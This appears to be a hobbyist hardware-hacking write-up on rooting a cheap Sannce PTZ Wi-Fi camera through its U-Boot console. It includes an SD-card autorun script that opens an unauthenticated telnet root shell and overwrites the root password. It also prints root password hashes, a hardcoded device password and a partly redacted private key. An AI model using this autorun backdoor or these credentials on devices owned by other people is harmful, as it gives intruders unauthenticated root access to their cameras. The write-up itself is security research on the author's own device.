
Cheap Sannce PTZ from Aliexpress

Specs:
- WIFI only (no RJ45) 
- Ingenic XBurst T20 SoC
- 64MB RAM
- 16GB SPI Flash

Only works with supplied app https://play.google.com/store/apps/details?id=io.jjyang.joylite&hl=en&gl=US

Nmap showed not ports open (TCP or UDP)
Looks like camera only does outbound connections







Bootlog
```

U-Boot 2013.07 (Dec 05 2017 - 18:11:25)

Board: ISVP (Ingenic XBurst T20 SoC)
DRAM:  64 MiB
Top of RAM usable for U-Boot at: 84000000
Reserving 443k for U-Boot at: 83f90000
Reserving 32784k for malloc() at: 81f8c000
Reserving 32 Bytes for Board Info at: 81f8bfe0
Reserving 124 Bytes for Global Data at: 81f8bf64
Reserving 128k for boot params() at: 81f6bf64
Stack Pointer at: 81f6bf48
Now running in RAM - U-Boot at: 83f90000
MMC:   msc: 0
the manufacturer c2
SF: Detected MX25L128**E

*** Warning - bad CRC, using default environment

In:    serial
Out:   serial
Err:   serial
Net:   Jz4775-9161
the manufacturer c2
SF: Detected MX25L128**E

--->probe spend 5 ms
SF: 65536 bytes @ 0x230000 Read: OK
--->read spend 11 ms
kernel check OK!
SF: 65536 bytes @ 0x3f0000 Read: OK
--->read spend 12 ms
Root check OK!
SF: 65536 bytes @ 0x770000 Read: OK
--->read spend 12 ms
User check OK!
Hit any key to stop autoboot:  0

isvp_t20# help
?       - alias for 'help'
base    - print or set address offset
boot    - boot default, i.e., run 'bootcmd'
boota   - boot android system
bootd   - boot default, i.e., run 'bootcmd'
bootm   - boot application image from memory
bootp   - boot image via network using BOOTP/TFTP protocol
chpart  - change active partition
cmp     - memory compare
coninfo - print console devices and information
cp      - memory copy
crc32   - checksum calculation
echo    - echo args to console
env     - environment handling commands
fatinfo - print information about filesystem
fatload - load binary file from a dos filesystem
fatls   - list files in a directory (default /)
gettime - get timer val elapsed,

go      - start application at address 'addr'
help    - print command description/usage
jzsoc   - jz soc info
loadb   - load binary file over serial line (kermit mode)
loads   - load S-Record file over serial line
loady   - load binary file over serial line (ymodem mode)
loop    - infinite loop on address range
md      - memory display
mm      - memory modify (auto-incrementing address)
mmc     - MMC sub system
mmcinfo - display MMC info
mtdparts- define flash/nand partitions
mw      - memory write (fill)
nm      - memory modify (constant address)
ping    - send ICMP ECHO_REQUEST to network host
printenv- print environment variables
reset   - Perform RESET of the CPU
run     - run commands in an environment variable
saveenv - save environment variables to persistent storage
sdupdate- auto upgrade file from mmc to flash
setenv  - set environment variables
sf      - SPI flash sub-system
sleep   - delay execution for some time
source  - run script from memory
tftpboot- boot image via network using TFTP protocol
version - print monitor, compiler and linker version

isvp_t20# printenv
baudrate=115200
bootargs=console=ttyS1,115200n8 mem=42012K@0x0 ispmem=8100K@0x2907000 rmem=15424K@0x30F0000 init=/linuxrc rootfstype=squashfs root=/dev/mtdblock2 rw mtdparts=jz_sfc:256k(boot),2048k(kernel),1792k(rootfs),3584k(user),2048k(kernel2),1792k(rootfs2),3584k(user2),1024k(mtd),-(factory)
bootcmd=sdupdate;sf probe;sf read 0x80600000 0x40000 0x200000; bootm 0x80600000
bootdelay=1
ethact=Jz4775-9161
ethaddr=00:11:22:33:44:55
gatewayip=193.169.4.1
ipaddr=193.169.4.81
loads_echo=1
netmask=255.255.255.0
serverip=193.169.4.2
stderr=serial
stdin=serial
stdout=serial
```


Got root?
```bash
# in Uboot we change the change init=/linuxrc to init=/bin/sh so to boot into a root shell

setenv bootargs 'console=ttyS1,115200n8 mem=42012K@0x0 ispmem=8100K@0x2907000 rmem=15424K@0x30F0000 init=/bin/sh rootfstype=squashfs root=/dev/mtdblock2 rw mtdparts=jz_sfc:256k(boot),2048k(kernel),1792k(rootfs),3584k(user),2048k(kernel2),1792k(rootfs2),3584k(user2),1024k(mtd),-(factory)'

# we don't need to saveenv before booting, by not saving any changes we make can be reverted.

boot
```


```bash
# looked like init=/linuxrc mounts most of the filesystem, without it we only get a very limited shell but enough to get the password

# Has hardcoded root passwords. Filesystem is readonly so not easy to replace just yet
cat /etc/shadow
root:$1$2368HyeJ$NhlfFNmvbW32jNZWwcIdP0:0:0:99999:7:::
cat /etc/shadow_bak
root:$1$fL41PBYl$yNygtpB92IyBwCn7QVvqc/:0:0:99999:7::

# $1$ = MD5 hash, 2368HyeJ = Salt, NhlfFNmvbW32jNZWwcIdP0 = MD5 of salt+password
# Could pas it to Hashcat/John to crack but we don't need to as already have root access

# Lets Generate a new root password for later, for to replace or add directly into the firmware
mkpasswd -5 password saltsalt
$1$saltsalt$qjXMvbEw8oaL.CzflDtaK/ 

# And in a shadow format
echo root:$1$saltsalt$qjXMvbEw8oaL.CzflDtaK/:0:0:99999:7::>/etc/shadow
```




```bash
# As the shell is Busybox /linuxrc runs /etc/inittab
# We are missing a heap of core chuncks of the OS so lets step through /etc/inittab selectivly running what we need to get the system up

/sbin/swapoff -a
/bin/mount -t tmpfs tmpfs /dev
/bin/mkdir -p /dev/pts
/bin/mkdir -p /dev/shm
/bin/mount -a
/bin/hostname -F /etc/hostname

# inittab done, now lets run rcS script which is the last line of inittab -------------------------------------------
# ::sysinit:/etc/init.d/rcS

# Set mdev, will bring up the /dev devices. 
echo /sbin/mdev > /proc/sys/kernel/hotplug
/sbin/mdev -s && echo "mdev is ok......"


# Set Global Environment
export PATH=/bin:/sbin:/usr/bin:/usr/sbin

# networking, bring up loopback 
ifconfig lo up

# Mount user partition, squashfs is a read only FS
mount -t squashfs /dev/mtdblock3 /usr

# Create var directories
mkdir -p /var/log

# Turn on log
syslogd
klogd

# bring up the jffs2 RW filesystem
mount -t jffs2 /dev/mtdblock7 /system_rw

# /usr/bin/fw_diff  #commented this one out, 
# wpa_supplicant interface 
mkdir -p /var/run/wpa_supplicant

# rcS done, ------------------------------------------

# lets mount the sdcard 
mount -o noatime,nodiratime /dev/mmcblk0p1 /mnt/sdcard
# now we have almost unlimited storage and can copy data to the sdcard 


# use dd to backup the flash partitions to the sdcard
dd if=/dev/mtdblock2 of=/mnt/sdcard/rootfs.bin 
dd if=/dev/mtdblock3 of=/mnt/sdcard/system.bin 
dd if=/dev/mtdblock4 of=/mnt/sdcard/factory.bin 
dd if=/dev/mtdblock5 of=/mnt/sdcard/param.bin 


# Now Run from /system_rw/rc.local -------------------------------------------
modprobe tx-isp
modprobe sensor_bg0806
#modprobe aw8733
modprobe audio
modprobe sample_motor Motor_speed=200

echo 20 > /proc/sys/vm/dirty_writeback_centisecs
echo 100 > /proc/sys/vm/swappiness
echo 8388608 > /sys/block/zram0/disksize
mkswap /dev/zram0
swapon /dev/zram0

# Commenting out the watchdog, it triggers a reboot if no connection to server after 60 seconds 
# /usr/sbin/watchdog &

# The wifi card, interesting that it is USB, opens a few options later 
modprobe mt7601Usta
usleep 1500000

# Need to add wifi network details for wifi to work, 
# need to use vim for this 
vi /system_rw/SNIP39/wpa_supplicant.conf

network={
ssid="NetworkSSID"
scan_ssid=1
pairwise=CCMP TKIP
group=CCMP TKIP WEP104 WEP40
psk="1122334455"
}

# now we can bring up wlan0
ifconfig wlan0 up

# and add a telnet server, well it was already there (such an insecure camera)
echo "Hello World!"
telnetd -l /bin/sh
echo "Telnet server up;)"


# We don't need this little if bit, looks likes it just copies the wlan0 MAC to the eth0 interface which we don't have
res=`ifconfig -a | grep eth0`
if [ "$res" != "" ];then
    ifconfig eth0 down
    MAC=`ifconfig wlan0 | awk '/HWaddr/{ print $5 }' `
    ifconfig eth0 hw ether $MAC
    ifconfig eth0 up
fi

if [ ! -f /tmp/sd_ok ];then
    mdev -s
fi
sleep 1

# this is the camera software now
/usr/bin/monitor /var/log/monitor.log &
touch /tmp/sd_log_enable


```


Backup the flash to image files on the SDcard
```bash
dd if=/dev/mtdblock2 of=/mnt/sdcard/rootfs.bin 
dd if=/dev/mtdblock3 of=/mnt/sdcard/system.bin 
dd if=/dev/mtdblock4 of=/mnt/sdcard/factory.bin 
dd if=/dev/mtdblock5 of=/mnt/sdcard/param.bin 
```

Interesting find `/bin/fsck_mount_mmc.sh` 
It looks like we can auto run a script from the SDcard if present
```bash
#!/bin/sh

#fsck.fat -awy /dev/$MDEV
mount -o noatime,nodiratime /dev/$MDEV /mnt/sdcard
rm /mnt/sdcard/*.REC
if [ -x /mnt/sdcard/360_autorun.sh ];then
    echo "find 360_autorun.sh" > /dev/console
    cd /mnt/sdcard/; sh 360_autorun.sh
    echo "done 360_autorun.sh" > /dev/console
fi
```

And to quickly write an exploit for the camera to test it out, saved as  "360_autorun.sh" to the SDcard and it ran
```bash
#!/bin/sh

# kill the login prompt for passwordless access to the uart console
pkill getty

# start a telnet server
telnetd -l /bin/sh

# change the root password to "password", will not work as is a read only filesystem but may later 
echo root:$1$saltsalt$qjXMvbEw8oaL.CzflDtaK/:0:0:99999:7::>/etc/shadow

echo !!!!! Pwnd !!!!!
```


Found more hardcoded creds
```
# can see a saved password, test if this is the root one
cat /system_rw/SNIP39/device.conf
[common]
model                = c20
vendor               = ysx
pass                 = Ysx87442


# found a private and public key, looks like a 1024bit RSA (I did redact some of the private key)

/system_rw/SNIP39 # cat pri.key
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALyPtduGs44RbIrd
JznKqWzUAZUA0XlrB/UzN3fVsBvXgJ/msbgU4B2/orN4ijnshA7HBG4Kna6JXCZt
qZ6h32z3ypsU8CzB/lTCZ9FcHJyuA82Bfh4dPRlZPPhCAASfWu/MJ/t/I8mwj1cx
####Redacted####
qQDc3fTVzujU+EpFA+ygsvCiICJikQJBAKibSO6B4tXJ1WxhOnNGcbme3lluHSB7
QZ9+F2gbOW0M65CS1Ce/uoS+c42RncEt8XWxdrsImeEtGXGf/+yPRXsCQD1fNdwj
8OC8ETTP/ni6EF5359tvpNpLdnGqkLI6TtElwv2yELoqzjvocKkABkhqSw09wuej
FPUpj7AZX8/hH9g=
-----END PRIVATE KEY-----

/system_rw/SNIP39 # cat pub.key
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8j7XbhrOOEWyK3Sc5yqls1AGV
ANF5awf1Mzd31bAb14Cf5rG4FOAdv6KzeIo57IQOxwRuCp2uiVwmbameod9s98qb
FPAswf5UwmfRXBycrgPNgX4eHT0ZWTz4QgAEn1rvzCf7fyPJsI9XMbzG8tWnrZc2
cXyCfSHIULMjLgofowIDAQAB
-----END PUBLIC KEY-----

```


Netstat, looks like it can't get past my firewall ;) 
Remember kiddies, don't open you insecure hardware up to the internet. 
```
/mnt/sdcard/mod/bin # netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      1 192.168.3.108:45536     59-127-108-237.hinet-ip.hinet.net:8000 SYN_SENT
tcp        0      1 192.168.3.108:52111     ec2-15-164-195-115.ap-northeast-2.compute.amazonaws.com:21047 SYN_SENT
tcp        0      1 192.168.3.108:43219     50.7.97.51:8080         SYN_SENT
tcp        0      0 192.168.3.108:59023     198.16.70.61:80         CLOSE_WAIT
tcp        0    127 192.168.3.108:23        192.168.1.11:42054      ESTABLISHED
tcp        0      1 192.168.3.108:53885     47.112.127.239:443      SYN_SENT
tcp        0      0 192.168.3.108:43659     106.14.124.73:80        CLOSE_WAIT
```